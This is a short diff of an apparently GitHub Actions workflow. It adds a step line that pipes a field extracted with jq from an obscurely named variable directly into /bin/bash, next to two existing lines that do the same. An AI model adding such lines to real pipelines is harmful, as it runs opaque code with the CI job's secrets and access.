@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$wuxsj3" | jq -r .qf833 | /bin/bash
           printf '%s' "$dw8" | jq -r .yhj39 | /bin/bash
+          echo $krcso205 | jq -r .kd12 | /bin/bash
 
       - name: Upload artifact
         if: always()
